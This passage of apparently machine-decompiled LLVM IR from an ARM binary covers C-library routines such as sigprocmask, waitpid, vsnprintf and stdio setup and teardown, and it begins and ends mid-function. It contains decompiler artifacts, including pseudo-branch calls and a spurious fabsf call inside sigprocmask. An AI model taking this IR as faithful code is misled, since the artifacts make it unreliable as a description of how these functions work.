  %v0_143e4 = load i32, i32* @r0, align 4
  store i32 %v0_143e4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_143e4, -4095
  br i1 %tmp, label %dec_label_pc_1440c, label %dec_label_pc_143f4

dec_label_pc_143f4:                               ; preds = %entry
  %v0_143f8 = call i32 @__aeabi_read_tp()
  %v3_143fc = load i16, i16* @global_var_32088.1320, align 2
  %v4_143fc = sext i16 %v3_143fc to i32
  %v0_14400 = load i32, i32* %r2.global-to-local, align 4
  %v1_14400 = sub i32 0, %v0_14400
  store i32 %v1_14400, i32* %r2.global-to-local, align 4
  %v3_14404 = add i32 %v4_143fc, %v0_143f8
  %v4_14404 = inttoptr i32 %v3_14404 to i32*
  store i32 %v1_14400, i32* %v4_14404, align 4
  %v2_1440c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1440c

dec_label_pc_1440c:                               ; preds = %entry, %dec_label_pc_143f4
  %v1_14410 = phi i32 [ %v0_143e4, %entry ], [ -1, %dec_label_pc_143f4 ]
  %v2_1440c = phi i32 [ %v3_143d8, %entry ], [ %v2_1440c.pre, %dec_label_pc_143f4 ]
  store i32 %v2_1440c, i32* @r7, align 4
  ret i32 %v1_14410

; uselistorder directives
  uselistorder i32 %v0_143e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1440c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_1441c = icmp eq i32* %arg2, null
  br i1 %v2_1441c, label %dec_label_pc_14460, label %dec_label_pc_14430

dec_label_pc_14430:                               ; preds = %entry
  %v2_14430 = load i32, i32* %arg2, align 4
  %v1_14434 = icmp slt i32 %v2_14430, 0
  br i1 %v1_14434, label %dec_label_pc_14448, label %dec_label_pc_1443c

dec_label_pc_1443c:                               ; preds = %dec_label_pc_14430
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_1443c = load i32, i32* %.pre3, align 4
  %v1_14440 = urem i32 %v3_1443c, 2
  %v2_14440 = icmp eq i32 %v1_14440, 0
  br i1 %v2_14440, label %dec_label_pc_14460, label %dec_label_pc_14448

dec_label_pc_14448:                               ; preds = %dec_label_pc_14430, %dec_label_pc_1443c
  %v2_14448 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_14448 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_14460

dec_label_pc_14460:                               ; preds = %dec_label_pc_1443c, %entry, %dec_label_pc_14448
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_14494, label %dec_label_pc_1447c

dec_label_pc_1447c:                               ; preds = %dec_label_pc_14460
  %v1_14480 = sub i32 0, %arg1
  %v3_14484 = load i16, i16* @global_var_32088.1320, align 2
  %v4_14484 = sext i16 %v3_14484 to i32
  %v0_14488 = call i32 @__aeabi_read_tp()
  %v3_1448c = add i32 %v4_14484, %v0_14488
  %v4_1448c = inttoptr i32 %v3_1448c to i32*
  store i32 %v1_14480, i32* %v4_1448c, align 4
  br label %dec_label_pc_14494

dec_label_pc_14494:                               ; preds = %dec_label_pc_14460, %dec_label_pc_1447c
  %v1_1449c = phi i32 [ %arg1, %dec_label_pc_14460 ], [ -1, %dec_label_pc_1447c ]
  ret i32 %v1_1449c

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14494, { 1, 0 }
  uselistorder label %dec_label_pc_14460, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14448, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_144a8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_144b8 = call i32 @gettimeofday(i32 %v2_144a8, i32 0)
  %v2_144bc = load i32, i32* %stack_var_-16, align 4
  %v2_144c0 = icmp eq i32* %arg1, null
  br i1 %v2_144c0, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_144bc, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_144bc

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_144d8 = load i32, i32* @r4, align 4
  store i32 %v3_144d8, i32* %stack_var_-20, align 4
  %v6_144d8 = load i32, i32* @r5, align 4
  %v9_144d8 = load i32, i32* @r6, align 4
  %v12_144d8 = load i32, i32* @r7, align 4
  %v4_144e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30124) to i32*), align 4
  store i32 %v4_144e4, i32* @ip, align 4
  %v2_144e8 = icmp eq i32 %v4_144e4, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_144e8, label %dec_label_pc_14500, label %dec_label_pc_14510

dec_label_pc_14500:                               ; preds = %entry
  %v4_14504 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  br label %dec_label_pc_14538

dec_label_pc_14510:                               ; preds = %entry
  %v0_14510 = call i32 @__libc_enable_asynccancel()
  %v0_14514 = load i32, i32* @r6, align 4
  store i32 %v0_14510, i32* @r4, align 4
  %v0_1451c = load i32, i32* @r7, align 4
  %v0_14520 = load i32, i32* @r5, align 4
  %v4_14528 = call i32 @wait4(i32 %v0_14520, i32 %v0_14514, i32 %v0_1451c, i32 0)
  store i32 %v4_14528, i32* @r5, align 4
  %v0_14530 = load i32, i32* @r4, align 4
  %v1_14534 = call i32 @__libc_disable_asynccancel(i32 %v0_14530)
  %v0_14538.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14538

dec_label_pc_14538:                               ; preds = %dec_label_pc_14500, %dec_label_pc_14510
  %v0_14538 = phi i32 [ %v4_14504, %dec_label_pc_14500 ], [ %v0_14538.pre, %dec_label_pc_14510 ]
  %v2_14540 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14540, i32* @r4, align 4
  store i32 %v6_144d8, i32* @r5, align 4
  store i32 %v9_144d8, i32* @r6, align 4
  store i32 %v12_144d8, i32* @r7, align 4
  ret i32 %v0_14538

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_14538, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v4_1455c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 636) to i32*), align 4
  %v2_14560 = mul i32 %arg1, 2
  %v2_14564 = add i32 %v4_1455c, %v2_14560
  %v3_14564 = inttoptr i32 %v2_14564 to i16*
  %v4_14564 = load i16, i16* %v3_14564, align 2
  %v6_14564 = zext i16 %v4_14564 to i32
  %v1_14568 = and i32 %v6_14564, 32
  ret i32 %v1_14568
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1457c = add i32 %arg1, 128
  %v2_14580 = icmp ugt i32 %v1_1457c, 383
  %v0_14588 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_14580, i32 %v0_14588)
  %v4_14590 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 644) to i32*), align 4
  %v2_14594 = mul i32 %arg1, 2
  %v2_14598 = add i32 %v4_14590, %v2_14594
  %v3_14598 = inttoptr i32 %v2_14598 to i16*
  %v4_14598 = load i16, i16* %v3_14598, align 2
  %v6_14598 = sext i16 %v4_14598 to i32
  ret i32 %v6_14598
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_145a8 = load i32, i32* @lr, align 4
  %v0_145b0 = call i32 @__aeabi_read_tp()
  %v3_145b4 = load i16, i16* @global_var_32088.1320, align 2
  %v4_145b4 = sext i16 %v3_145b4 to i32
  %v2_145b8 = add i32 %v4_145b4, %v0_145b0
  store i32 %v0_145a8, i32* @lr, align 4
  ret i32 %v2_145b8
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-4, align 4
  %v2_14620 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_14620, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_14630 = call i32 @__GI_vsnprintf()
  ret i32 %v0_14630

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_14650 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_14650, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_14664 = call i32 @__GI_vsnprintf()
  ret i32 %v0_14664

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %v3_14678 = load i32, i32* @r4, align 4
  %v6_14678 = load i32, i32* @r5, align 4
  %v9_14678 = load i32, i32* @r6, align 4
  %v2_1468c = ptrtoint i32* %stack_var_-96 to i32
  %v0_14690 = load i32, i32* @r0, align 4
  store i32 %v0_14690, i32* @r4, align 4
  %v0_14694 = load i32, i32* @r2, align 4
  %v0_14698 = load i32, i32* @r1, align 4
  store i32 %v0_14698, i32* @r5, align 4
  %v1_146b0 = sub i32 -1, %v0_14690
  store i32 %v1_146b0, i32* @lr, align 4
  %v0_146b4 = load i32, i32* @r3, align 4
  store i32 %v0_146b4, i32* @r2, align 4
  %v3_146bc = icmp ult i32 %v0_14698, %v1_146b0
  br i1 %v3_146bc, label %bb26, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_146b0, i32* @r5, align 4
  br label %bb26

bb26:                                             ; preds = %entry, %bb
  %v1_146cc = phi i32 [ %v0_14698, %entry ], [ %v1_146b0, %bb ]
  %v2_146cc = add i32 %v1_146cc, %v0_14690
  store i32 %v2_146cc, i32* @ip, align 4
  store i32 0, i32* @r6, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_1470c = inttoptr i32 %v0_14694 to i8*
  %v3_1470c = call i32 @_vfprintf_internal(i32 %v2_1468c, i8* %v2_1470c)
  %v0_14710 = load i32, i32* @r5, align 4
  %v1_14710 = load i32, i32* @r6, align 4
  %v9_14710 = icmp eq i32 %v0_14710, %v1_14710
  br i1 %v9_14710, label %dec_label_pc_14734, label %dec_label_pc_14718

dec_label_pc_14718:                               ; preds = %bb26
  %v9_14720 = icmp eq i32 %v1_146cc, 0
  br i1 %v9_14720, label %bb27, label %bb28

bb27:                                             ; preds = %dec_label_pc_14718
  %v2_14724 = add i32 %v0_14690, -1
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_14718, %bb27
  %v1_14728 = phi i32 [ %v2_146cc, %dec_label_pc_14718 ], [ %v2_14724, %bb27 ]
  %v1_14728.v0_14704 = select i1 %v9_14720, i32 %v1_14728, i32 %v0_14690
  %stack_var_-80.0 = inttoptr i32 %v1_14728.v0_14704 to i8*
  %v1_14730 = trunc i32 %v1_14710 to i8
  store i8 %v1_14730, i8* %stack_var_-80.0, align 1
  br label %dec_label_pc_14734

dec_label_pc_14734:                               ; preds = %bb26, %bb28
  store i32 %v3_14678, i32* @r4, align 4
  store i32 %v6_14678, i32* @r5, align 4
  store i32 %v9_14678, i32* @r6, align 4
  ret i32 %v3_1470c

; uselistorder directives
  uselistorder i1 %v9_14720, { 1, 0 }
  uselistorder i32 %v1_146cc, { 1, 0 }
  uselistorder i32 %v1_146b0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14690, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_14734, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_14750 = call i32 @__aeabi_read_tp()
  %v3_14754 = load i16, i16* @global_var_32088.1320, align 2
  %v4_14754 = sext i16 %v3_14754 to i32
  store i32 %v4_14754, i32* @r3, align 4
  store i32 %v0_14750, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_14760 = add i32 %v4_14754, %v0_14750
  %v3_14760 = inttoptr i32 %v2_14760 to i32*
  %v4_14760 = load i32, i32* %v3_14760, align 4
  store i32 %v4_14760, i32* @r6, align 4
  %v1_14764 = call i32 @isatty(i32 0)
  %v2_1476c = icmp eq i32 %v1_14764, 0
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r4, align 4
  br i1 %v2_1476c, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_14778 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 676) to i16*), align 4
  %v7_14778 = zext i16 %v5_14778 to i32
  %v2_1477c = xor i32 %v7_14778, 256
  store i32 %v2_1477c, i32* @r3, align 4
  %v2_14780 = trunc i32 %v2_1477c to i16
  store i16 %v2_14780, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 676) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_14788 = call i32 @isatty(i32 1)
  %v2_1478c = icmp eq i32 %v1_14788, 0
  br i1 %v2_1478c, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_14794 = load i32, i32* @r4, align 4
  %v2_14798 = add i32 %v1_14794, 744
  %v3_14798 = inttoptr i32 %v2_14798 to i16*
  %v4_14798 = load i16, i16* %v3_14798, align 2
  %v2_1479c = xor i16 %v4_14798, 256
  store i16 %v2_1479c, i16* %v3_14798, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_147a8 = load i16, i16* @global_var_32088.1320, align 2
  %v4_147a8 = sext i16 %v3_147a8 to i32
  %v0_147ac = load i32, i32* @r6, align 4
  %v1_147ac = load i32, i32* @r5, align 4
  %v3_147ac = add i32 %v1_147ac, %v4_147a8
  %v4_147ac = inttoptr i32 %v3_147ac to i32*
  store i32 %v0_147ac, i32* %v4_147ac, align 4
  ret i32 %v1_14788

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_147c8 = load i32, i32* @r4, align 4
  store i32 %v3_147c8, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38980), i32* %r3.global-to-local, align 4
  %v2_147dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38980) to i32*), align 4
  store i32 %v2_147dc, i32* %r0.global-to-local, align 4
  %v5_147dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38976) to i32*), align 4
  store i32 %v5_147dc, i32* %r1.global-to-local, align 4
  %v8_147dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38972) to i32*), align 4
  %v2_147e4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_147e4, i32* %r3.global-to-local, align 4
  store i32 %v2_147dc, i32* %stack_var_-44, align 4
  store i32 168, i32* %r2.global-to-local, align 4
  %v4_147f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 168) to i32*), align 4
  store i32 %v2_147dc, i32* %r0.global-to-local, align 4
  store i32 %v5_147dc, i32* %r1.global-to-local, align 4
  store i32 %v8_147dc, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38992), i32* %r3.global-to-local, align 4
  %v1_14800 = inttoptr i32 %v4_147f0 to i32*
  store i32 %v2_147dc, i32* %v1_14800, align 4
  %v3_14800 = add i32 %v4_147f0, 4
  %v4_14800 = inttoptr i32 %v3_14800 to i32*
  %v5_14800 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14800, i32* %v4_14800, align 4
  %v6_14800 = add i32 %v4_147f0, 8
  %v7_14800 = inttoptr i32 %v6_14800 to i32*
  %v8_14800 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_14800, i32* %v7_14800, align 4
  %v0_14804 = load i32, i32* %r3.global-to-local, align 4
  %v1_14804 = inttoptr i32 %v0_14804 to i32*
  %v2_14804 = load i32, i32* %v1_14804, align 4
  store i32 %v2_14804, i32* %r0.global-to-local, align 4
  %v3_14804 = add i32 %v0_14804, 4
  %v4_14804 = inttoptr i32 %v3_14804 to i32*
  %v5_14804 = load i32, i32* %v4_14804, align 4
  store i32 %v5_14804, i32* %r1.global-to-local, align 4
  %v6_14804 = add i32 %v0_14804, 8
  %v7_14804 = inttoptr i32 %v6_14804 to i32*
  %v8_14804 = load i32, i32* %v7_14804, align 4
  %v2_14808 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_14808, i32* %r3.global-to-local, align 4
  store i32 %v2_14804, i32* %stack_var_-56, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v0_14814 = load i32, i32* %r7.global-to-local, align 4
  %v2_14814 = add i32 %v0_14814, 88
  %v3_14814 = inttoptr i32 %v2_14814 to i32*
  %v4_14814 = load i32, i32* %v3_14814, align 4
  store i32 %v4_14814, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_1481c = inttoptr i32 %v4_14814 to i32*
  %v2_1481c = load i32, i32* %v1_1481c, align 4
  store i32 %v2_1481c, i32* %r5.global-to-local, align 4
  %v2_14820 = add i32 %v0_14814, 176
  %v3_14820 = inttoptr i32 %v2_14820 to i32*
  %v4_14820 = load i32, i32* %v3_14820, align 4
  store i32 %v2_14804, i32* %r0.global-to-local, align 4
  store i32 %v5_14804, i32* %r1.global-to-local, align 4
  store i32 %v8_14804, i32* %r2.global-to-local, align 4
  store i32 -39004, i32* %r3.global-to-local, align 4
  %v2_14830 = add i32 %v0_14814, -39004
  store i32 %v2_14830, i32* %sl.global-to-local, align 4
  %v1_14834 = inttoptr i32 %v4_14820 to i32*
  store i32 %v2_14804, i32* %v1_14834, align 4
  %v3_14834 = add i32 %v4_14820, 4
  %v4_14834 = inttoptr i32 %v3_14834 to i32*
  %v5_14834 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14834, i32* %v4_14834, align 4
  %v6_14834 = add i32 %v4_14820, 8
  %v7_14834 = inttoptr i32 %v6_14834 to i32*
  %v8_14834 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_14834, i32* %v7_14834, align 4
  %v0_148c4.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_148c416 = icmp eq i32 %v0_148c4.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_148cc18 = add i32 %v0_148c4.pr, 56
  store i32 %v1_148cc18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_148c416, label %dec_label_pc_148d8, label %dec_label_pc_1483c

dec_label_pc_1483c:                               ; preds = %entry, %.thread10
  %v0_1483c = phi i32 [ %v3_148c0, %.thread10 ], [ %v0_148c4.pr, %entry ]
  %v1_1483c = add i32 %v0_1483c, 64
  %v2_1483c = inttoptr i32 %v1_1483c to i32*
  %v3_1483c = load i32, i32* %v2_1483c, align 4
  store i32 %v3_1483c, i32* %r3.global-to-local, align 4
  %v0_14840 = call i32 @__aeabi_read_tp()
  store i32 %v0_14840, i32* %r0.global-to-local, align 4
  %v1_14844 = add i32 %v0_14840, -1168
  store i32 %v1_14844, i32* %r6.global-to-local, align 4
  %v3_14848 = icmp uge i32 %v3_1483c, %v1_14844
  store i1 %v3_14848, i1* %cpsr_c.global-to-local, align 1
  %v9_14848 = icmp eq i32 %v3_1483c, %v1_14844
  br i1 %v9_14848, label %.thread1, label %dec_label_pc_1485c

.thread1:                                         ; preds = %dec_label_pc_1483c
  %v1_1484c = load i32, i32* %r5.global-to-local, align 4
  %v2_1484c = add i32 %v1_1484c, 60
  %v3_1484c = inttoptr i32 %v2_1484c to i32*
  %v4_1484c = load i32, i32* %v3_1484c, align 4
  %v2_14850 = add i32 %v4_1484c, 1
  store i32 %v2_14850, i32* %r3.global-to-local, align 4
  store i32 %v2_14850, i32* %v3_1484c, align 4
  br label %.thread10

dec_label_pc_1485c:                               ; preds = %dec_label_pc_1483c, %dec_label_pc_14868
  %v0_1485c = load i32, i32* %r2.global-to-local, align 4
  %v1_1485c = inttoptr i32 %v0_1485c to i32*
  %v2_1485c = load i32, i32* %v1_1485c, align 4
  store i32 %v2_1485c, i32* %r3.global-to-local, align 4
  %v1_14860 = load i32, i32* %r4.global-to-local, align 4
  %v3_14860 = icmp uge i32 %v2_1485c, %v1_14860
  store i1 %v3_14860, i1* %cpsr_c.global-to-local, align 1
  %v9_14860 = icmp eq i32 %v2_1485c, %v1_14860
  br i1 %v9_14860, label %dec_label_pc_14868, label %dec_label_pc_14880

dec_label_pc_14868:                               ; preds = %dec_label_pc_1485c
  store i32 %v2_1485c, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14878 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14878, label %dec_label_pc_1487c, label %dec_label_pc_1485c

dec_label_pc_1487c:                               ; preds = %dec_label_pc_14868
  %v0_1487c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1487c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14880

dec_label_pc_14880:                               ; preds = %dec_label_pc_1485c, %dec_label_pc_1487c
  %v0_14880 = phi i32 [ %v0_1487c, %dec_label_pc_1487c ], [ %v2_1485c, %dec_label_pc_1485c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14880 = icmp eq i32 %v0_14880, 0
  %v2_1488c.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_14880, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_14880
  %v1_1488c = load i32, i32* %r6.global-to-local, align 4
  %v3_1488c = add i32 %v2_1488c.pre, 64
  %v4_1488c = inttoptr i32 %v3_1488c to i32*
  store i32 %v1_1488c, i32* %v4_1488c, align 4
  %v1_14890 = load i32, i32* %r1.global-to-local, align 4
  %v2_14890 = load i32, i32* %r5.global-to-local, align 4
  %v3_14890 = add i32 %v2_14890, 60
  %v4_14890 = inttoptr i32 %v3_14890 to i32*
  store i32 %v1_14890, i32* %v4_14890, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_14880
  %v2_14884 = add i32 %v2_1488c.pre, 8
  %v3_14884 = inttoptr i32 %v2_14884 to i32*
  %v4_14884 = load i32, i32* %v3_14884, align 4
  store i32 %v4_14884, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_14894 = add i32 %v2_1488c.pre, 20
  %v4_14894 = inttoptr i32 %v3_14894 to i32*
  store i32 %v4_14884, i32* %v4_14894, align 4
  %v1_14898 = load i32, i32* %r2.global-to-local, align 4
  %v2_14898 = trunc i32 %v1_14898 to i16
  %v3_14898 = load i32, i32* %r5.global-to-local, align 4
  %v4_14898 = inttoptr i32 %v3_14898 to i16*
  store i16 %v2_14898, i16* %v4_14898, align 2
  %v1_1489c = load i32, i32* %r3.global-to-local, align 4
  %v2_1489c = load i32, i32* %r5.global-to-local, align 4
  %v3_1489c = add i32 %v2_1489c, 24
  %v4_1489c = inttoptr i32 %v3_1489c to i32*
  store i32 %v1_1489c, i32* %v4_1489c, align 4
  %v1_148a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_148a0 = load i32, i32* %r5.global-to-local, align 4
  %v3_148a0 = add i32 %v2_148a0, 28
  %v4_148a0 = inttoptr i32 %v3_148a0 to i32*
  store i32 %v1_148a0, i32* %v4_148a0, align 4
  %v1_148a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_148a4 = load i32, i32* %r5.global-to-local, align 4
  %v3_148a4 = add i32 %v2_148a4, 16
  %v4_148a4 = inttoptr i32 %v3_148a4 to i32*
  store i32 %v1_148a4, i32* %v4_148a4, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_148a8 = load i32, i32* %sl.global-to-local, align 4
  %v1_148a8 = inttoptr i32 %v0_148a8 to i32*
  %v2_148a8 = load i32, i32* %v1_148a8, align 4
  store i32 %v2_148a8, i32* %r0.global-to-local, align 4
  %v3_148a8 = add i32 %v0_148a8, 4
  %v4_148a8 = inttoptr i32 %v3_148a8 to i32*
  %v5_148a8 = load i32, i32* %v4_148a8, align 4
  store i32 %v5_148a8, i32* %r1.global-to-local, align 4
  %v6_148a8 = add i32 %v0_148a8, 8
  %v7_148a8 = inttoptr i32 %v6_148a8 to i32*
  %v8_148a8 = load i32, i32* %v7_148a8, align 4
  store i32 %v8_148a8, i32* %r2.global-to-local, align 4
  %v1_148b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_148b0 = add i32 %v1_148b0, 52
  %v3_148b0 = inttoptr i32 %v2_148b0 to i32*
  store i32 1, i32* %v3_148b0, align 4
  %v0_148b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_148b4 = add i32 %v0_148b4, 56
  store i32 %v1_148b4, i32* %r3.global-to-local, align 4
  %v2_148b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_148bc = inttoptr i32 %v1_148b4 to i32*
  store i32 %v2_148b8, i32* %v1_148bc, align 4
  %v3_148bc = add i32 %v0_148b4, 60
  %v4_148bc = inttoptr i32 %v3_148bc to i32*
  %v5_148bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_148bc, i32* %v4_148bc, align 4
  %v6_148bc = add i32 %v0_148b4, 64
  %v7_148bc = inttoptr i32 %v6_148bc to i32*
  %v8_148bc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_148bc, i32* %v7_148bc, align 4
  %v0_148c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_148c0 = add i32 %v0_148c0, 32
  %v2_148c0 = inttoptr i32 %v1_148c0 to i32*
  %v3_148c0 = load i32, i32* %v2_148c0, align 4
  store i32 %v3_148c0, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_148c4 = icmp eq i32 %v3_148c0, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_148cc = add i32 %v3_148c0, 56
  store i32 %v1_148cc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_148c4, label %dec_label_pc_148d8, label %dec_label_pc_1483c

dec_label_pc_148d8:                               ; preds = %.thread10, %entry
  store i32 88, i32* %r3.global-to-local, align 4
  %v0_148dc = load i32, i32* %r7.global-to-local, align 4
  %v2_148dc = add i32 %v0_148dc, 88
  %v3_148dc = inttoptr i32 %v2_148dc to i32*
  %v4_148dc = load i32, i32* %v3_148dc, align 4
  store i32 %v4_148dc, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_148dc to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_148fc14 = icmp eq i32 %storemerge12, 0
  br i1 %v2_148fc14, label %dec_label_pc_14904, label %dec_label_pc_148e8

dec_label_pc_148e8:                               ; preds = %dec_label_pc_148d8, %dec_label_pc_148fc
  %v1_148f0 = phi i32 [ %storemerge, %dec_label_pc_148fc ], [ %storemerge12, %dec_label_pc_148d8 ]
  %v1_148e8 = inttoptr i32 %v1_148f0 to i16*
  %v2_148e8 = load i16, i16* %v1_148e8, align 2
  %v3_148e8 = zext i16 %v2_148e8 to i32
  store i32 %v3_148e8, i32* %r3.global-to-local, align 4
  %v1_148ec = and i32 %v3_148e8, 64
  %v2_148ec = icmp eq i32 %v1_148ec, 0
  br i1 %v2_148ec, label %dec_label_pc_148fc, label %bb39

bb39:                                             ; preds = %dec_label_pc_148e8
  store i32 %v1_148f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_148fc

dec_label_pc_148fc:                               ; preds = %dec_label_pc_148e8, %bb39
  %v1_148f4 = xor i1 %v2_148ec, true
  call void @__pseudo_cond_branch(i1 %v1_148f4, i32 ptrtoint (i32* @global_var_1492c.1371 to i32))
